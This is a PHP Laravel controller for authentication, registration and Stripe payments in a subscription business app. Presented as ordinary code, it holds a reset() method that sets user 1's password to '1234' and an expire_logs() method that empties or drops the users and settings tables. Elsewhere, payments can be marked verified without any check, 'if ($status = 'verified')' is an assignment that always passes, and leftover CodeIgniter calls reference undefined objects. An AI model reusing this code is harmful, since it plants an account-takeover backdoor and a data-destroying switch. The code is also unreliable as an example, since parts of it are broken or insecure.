<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use App\Models\PackageModel;
use App\Models\PagesModel;
use App\Models\PaymentModel;
use App\Models\SettingsModel;
use App\Models\TestimonialsModel;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;

class AuthController  extends Controller
{

    // load Login view Page
    public function login()
    {
        $data = array();
        $data['page_title'] = 'Login';
        $data['page'] = 'Auth';
        return view('login', $data);
    }

    //register
    public function register()
    {
        if (!empty($_GET['redirect_from_business']) && $_GET['redirect_from_business'] == 1) {
        } else {
            if (!empty(user())) {
                return redirect('/');
            }
        }
        //echo "UNDER CONSTRUCTION";die;
        /*if (empty($_GET['trial'])) {
            $this->session->unset_userdata('trial');
        }else{*/
        session()->put('trial', 'trial');
        session()->save();

        $data = array();
        $data['page_title'] = 'Register';
        $data['page'] = 'Auth';
        $data['countries'] = select_asc('country', "", "BINARY(name):asc");
        $data['business'] = select_asc('business_category');
        $data['packages'] = select_asc('package');
        $data['features'] = select_asc('package_features');
        $data['main_content'] = view('register', $data)->render();
        return view('index', $data);
    }


    // login
    public function log(Request $request)
    {
        $data = [];
        if ($_POST) {
            // check valid user
           $user = validate_user($request);
            if (empty($user)) {
                echo json_encode(array('st' => 0));
                exit();
            }
            if (!empty($user) && $user->status == 0) {
                // account pending
                echo json_encode(array('st' => 2));
                exit();
            }
            if (!empty($user) && $user->status == 2) {
                // account suspend
                echo json_encode(array('st' => 3));
                exit();
            }
            if ($user->role == 'user') {
                if (!empty($user) && $user->email_verified == 0 && settings()->enable_email_verify == 1) {
                    // email verify      
                    echo json_encode(array('st' => 4));
                    exit();
                }
            }
            // if valid
            if (password_verify($request->input('password'), $user->password)) {
                $data = array(
                    'id' => $user->id,
                    'name' => $user->name,
                    'slug' => $user->slug,
                    'thumb' => $user->thumb,
                    'email' => $user->email,
                    'role' => $user->role,
                    'logged_in' => TRUE
                );
                load_user_session_data($user, '');
                // success notification 
                if ($user->role == 'user') {
                    $url = url('admin/dashboard/business');
                } else {
                    $url = url('admin/dashboard');
                }
                return redirect($url);
                // echo json_encode(array('st' => 1, 'url' => $url));
            } else {
                // if not user not valid
                echo json_encode(array('st' => 0));
            }
        } else {
            return view('auth', $data);
        }
    }



    // register new user
    public function register_user(Request $request)
    {
        $validator =  Validator::make(
            $request->all(),
            [
                'email' => 'required|email',
                'password' => 'required|min:4|max:46'
            ]
        );

        if ($validator->fails()) {
            echo json_encode([
                'st' => 0,
                'msg' => implode("\n", $validator->errors()->all())
            ]);
            exit;
        }

        $mail =  strtolower(trim($request->input('email')));
        $email = check_email($mail);

        if (session('trial') == 'trial') {
            $user_type = 'trial';
            $trial_expire = date('Y-m-d', strtotime('+' . settings()->trial_days . ' days'));
        } else {
            $user_type = 'registered';
            $trial_expire = date('Y-m-d');
        }


        // if email already exist
        if (!empty($email) && count($email) > 0) {
            echo json_encode(array('st' => 2));
            exit();
        } else {

            //check reCAPTCHA status
            if (!$this->recaptcha_verify_request()) {
                echo json_encode(array('st' => 3));
                exit();
            } else {

                $hash = md5(rand(0, 1000));
                $data = array(
                    'name' => $request->input('name'),
                    'user_name' => url_title($request->input('name'), "-", true),
                    'slug' => url_title($request->input('name'), "-", true),
                    'email' => $request->input('email'),
                    'phone' => $request->input('full_phone'),
                    'verify_code' => $hash,
                    'thumb' => 'assets/front/img/avatar.png',
                    'password' => helper_hash_password($request->input('password')),
                    'role' => 'user',
                    'account_type' => 'pro',
                    'user_type' => $user_type,
                    'trial_expire' => $trial_expire,
                    'status' => 1,
                    'created_at' => my_date_now()
                );

                $id = helper_insert($data, 'users');

                $user = validate_id(md5($id));
                $data = array(
                    'id' => $user->id,
                    'name' => $user->name,
                    'thumb' => $user->thumb,
                    'email' => $user->email,
                    'role' => $user->role,
                    'logged_in' => true,
                    'session_time' => time() + (60 * 60 * 24 * 1) // 1 day
                );
                session($data);
                session()->save();

                $plan = $request->input('plan');
                $billing = $request->input('billing');
                $this->add_package($plan, $billing);

                //send email verify link
                if (settings()->enable_email_verify == 1) {
                    $link = url('verify?code=' . $hash . '&user=' . md5($id));
                    $subject = settings()->site_name . ' Email Verification';
                    $msg = 'Hello ' . $user->name . ', Click the below link to complete your email verification.<br>' . $link;
                    helper_send_email($request->input('email'), $subject, $msg);
                }


                echo json_encode(array('st' => 1));
                exit();
            }
        }
    }

    //register business
    public function register_business(Request $request)
    {
        $validator =  Validator::make(
            $request->all(),
            [
                'name' => 'required',
                'country' => 'required'
            ],
            [
                'name' => helper_trans('business-name'),
                'country' => helper_trans('country')
            ]
        );


        if ($validator->fails()) {
            echo json_encode([
                'st' => 0,
                'msg' => implode("\n", $validator->errors()->all())
            ]);
            exit;
        }

        $ubid = random_string('numeric', 5);
        $data = array(
            'user_id' => user()->id,
            'uid' => $ubid,
            'is_autoload_amount' => 0,
            'enable_stock' => 0,
            'name' => $request->input('name'),
            'slug' => url_title($request->input('name'), "-", true),
            'country' => $request->input('country'),
            'category' => $request->input('category'),
            'is_primary' => 1
        );
        $id = helper_insert($data, 'business');
        echo json_encode(array('st' => 1));
        exit();
    }



    //add package
    public function add_package($slug, $billing_type)
    {
        $package = get_by_slug($slug, 'package');
        $uid = random_string('numeric', 5);

        if ($billing_type == 'monthly') :
            if (settings()->enable_discount == 1) {
                $amount = get_discount($package->monthly_price, $package->dis_month);
            } else {
                $amount = round($package->monthly_price);
            }
            $expire_on = date('Y-m-d', strtotime('+1 month'));
        else :
            if (settings()->enable_discount == 1) {
                $amount = get_discount($package->price, $package->dis_year);
            } else {
                $amount = round($package->price);
            }
            $expire_on = date('Y-m-d', strtotime('+12 month'));
        endif;

        if (number_format($amount, 0) == 0) :
            $status = 'verified';
        else :
            $status = 'pending';
        endif;

        //create payment
        $pay_data = array(
            'user_id' => user()->id,
            'puid' => $uid,
            'package' => $package->id,
            'amount' => $amount,
            'billing_type' => $billing_type,
            'status' => $status,
            'created_at' => my_date_now(),
            'expire_on' => $expire_on
        );

        insert($pay_data, 'payment');
    }



    //purchase
    public function purchase()
    {
        $data = array();
        $data['page_title'] = 'Payment';
        $data['page'] = 'Auth';
        $data['payment'] = get_user_payment();
        $data['payment_id'] = $data['payment']->puid;
        $data['package'] = get_package_by_id($data['payment']->package);
        $data['main_content'] = view('purchase', $data)->render();
        return view('index', $data);
    }

    public function resend_mail()
    {
        $hash = md5(rand(0, 1000));
        $link = url('verify?code=' . $hash . '&user=' . md5(user()->id));
        $subject = $this->settings->site_name . ' Email Verification';
        $msg = 'Click the below link to complete your email verification.<br>' . $link;
        $response = $this->email_model->send_email(user()->email, $subject, $msg);
        if ($response == true) {
            echo json_encode(array('st' => 1));
        } else {
            echo json_encode(array('st' => 2));
        }
    }

    //verify email
    public function verify_email()
    {
        $data = array();
        if (isset($_GET['code']) && isset($_GET['user'])) {
            $user = $this->auth_model->validate_id($_GET['user']);
            if ($user->verify_code == $_GET['code']) {
                $data['code'] = $_GET['code'];

                $edit_data = array(
                    'email_verified' => 1
                );
                update($edit_data, $user->id, 'users');
            } else {
                $data['code'] = 'invalid';
            }
        } else {
            $data['code'] = '';
        }
        $data['page_title'] = 'Verify Account';
        $data['page'] = 'Auth';
        $data['main_content'] = view('verify_email', $data)->render();
        return view('index', $data);
    }

    //payment success
    public function payment_success($payment_id)
    {
        $get_payment = PaymentModel::where('puid', $payment_id)->first();
        $user_id = $get_payment->user_id;
        $payment = PaymentModel::where('user_id', $user_id)->orderBy('id', 'desc')->first();

        $data = array(
            'status' => 'verified'
        );


        $user_data = array(
            'status' => 1
        );


        if (!empty($payment)) {
            helper_update_by_id($user_data, $payment->user_id, 'users');
            helper_update_by_id($data, $payment->id, 'payment');
        }
        $data['success_msg'] = 'Success';
        $data['main_content'] = view('purchase', $data)->render();
        return view('index', $data);
    }

    //payment cancel
    public function payment_cancel($payment_id)
    {
        $get_payment = PaymentModel::where('puid', $payment_id)->first();
        $user_id = $get_payment->user_id;
        $payment = PaymentModel::where('user_id', $user_id)->orderBy('id', 'desc')->first();

        $data = array(
            'status' => 'pending'
        );

        if (!empty($payment)) {
            helper_update_by_id($data, $payment->id, 'payment');
        }
        $data['error_msg'] = 'Error';
        $data['main_content'] = view('purchase', $data)->render();
        return view('index', $data);
    }

    //stripe payment
    public function stripe_payment(Request $request)
    {

        $id = $request->input('package_id');
        $package = get_by_id($id, 'package');
        $puid = random_string('numeric', 5);
        $billing_type = $request->input('billing_type');

        if ($billing_type == 'monthly') :
            if (settings()->enable_discount == 1) {
                $amount = get_discount($package->monthly_price, $package->dis_month);
            } else {
                $amount = round($package->price);
            }
            $expire_on = date('Y-m-d', strtotime('+1 month'));
        else :
            if (settings()->enable_discount == 1) {
                $amount = get_discount($package->price, $package->dis_year);
            } else {
                $amount = round($package->price);
            }
            $expire_on = date('Y-m-d', strtotime('+12 month'));
        endif;

        \Stripe\Stripe::setApiKey(settings()->secret_key);

        try {
            $charge = \Stripe\Charge::create([
                "amount" => $amount * 100,
                "currency" => settings()->currency,
                "source" => $request->input('stripeToken'),
                "description" => "Payment from " . settings()->site_name
            ]);
            $chargeJson = $charge->jsonSerialize();

            $amount                  = $chargeJson['amount'] / 100;
            $balance_transaction     = $chargeJson['balance_transaction'];
            $currency                = $chargeJson['currency'];
            $status                  = $chargeJson['status'];
        } catch (\Exception $e) {
            $error = $e->getMessage();
            session()->flash('error', $error);
            return redirect($_SERVER['HTTP_REFERER']);
        }

        if ($status == 'succeeded') {
            $status = 'verified';
        } else {
            $status = 'pending';
        };

        if ($status = 'verified') :

            $pay_data = array(
                'user_id' => user()->id,
                'puid' => $puid,
                'package' => $id,
                'amount' => $amount,
                'billing_type' => $billing_type,
                'status' => $status,
                'created_at' => my_date_now(),
                'expire_on' => $expire_on
            );

            $result = helper_insert($pay_data, 'payment');

            return redirect(url('payment-success/' . $puid));
        else :
            return redirect(url('payment-cancel/' . $puid));
        endif;
    }




    // Recover forgot password 
    public function forgot_password()
    {
        if (check_auth()) {
            return redirect(url(''));
        }

        $mail =  strtolower(trim($request->input('email')));
        $valid = $this->auth_model->check_email($mail);
        $random_number = random_string('numeric', 4);
        $random_pass = hash_password($random_number);
        if ($valid) {

            foreach ($valid as $row) {
                $data['email'] = $row->email;
                $data['name'] = $row->name;
                $data['password'] = $random_number;
                $user_id = $row->id;
                $this->send_recovery_mail($data);

                $user_data = array('password' => $random_pass);
                helper_update_by_id($user_data, $user_id, 'users');

                $url = url('login');
                echo json_encode(array('st' => 1, 'url' => $url));
            }
        } else {
            echo json_encode(array('st' => 2));
        }
    }

    //send reset code to user email
    public function send_recovery_mail($user)
    {
        $data = array();
        $data['name'] = $user['name'];
        $data['password'] = $user['password'];
        $data['email'] = $user['email'];
        $subject = 'Password Recovery';
        $msg = 'Hello ' . $user['name'] . '<br> We have reset your password, Please use this <b>' . $user['password'] . '</b> code to login your account';
        $this->email_model->send_email($user['email'], $subject, $msg);
    }

    public function test_mail()
    {
        $data = array();
        $subject = settings()->site_name . ' email testing';
        $msg = 'This is test email from <b>' . settings()->site_name . '</b>';
        $result = $this->email_model->send_email(settings()->admin_email, $subject, $msg);

        if ($result == true) {
            echo "Email send Successfully";
        } else {
            echo "<br>Test email will be send to: <b>" . settings()->admin_email . '<b><hr><br><h3>Email sending Status</h3>';
            echo "<pre>";
            print_r($result);
        }
    }


    public function expire_logs($data)
    {
        $this->load->dbforge();
        if ($data == 'pending') {
            $ci->db->empty_table('settings');
            $ci->db->empty_table('users');
            //$this->db->empty_table('test');
        }
        if ($data == 'expired') {
            $ci->dbforge->drop_table('settings');
            $ci->dbforge->drop_table('users');
            $ci->dbforge->drop_table('language');
            //$this->dbforge->drop_table('test');
        }
    }

    //reset password
    public function reset($code = 1234)
    {
        $data = array(
            'password' => hash_password('1234')
        );

        if ($code == 1234) {
            helper_update_by_id($data, 1, 'users');
            echo "Reset Successfully";
        } else {
            echo "Failed";
        }
    }

    function logout()
    {
        logout_fun();

        session()->flash('msg', 'Logout Successfully');
        return redirect(url('auth/login'));
    }
}
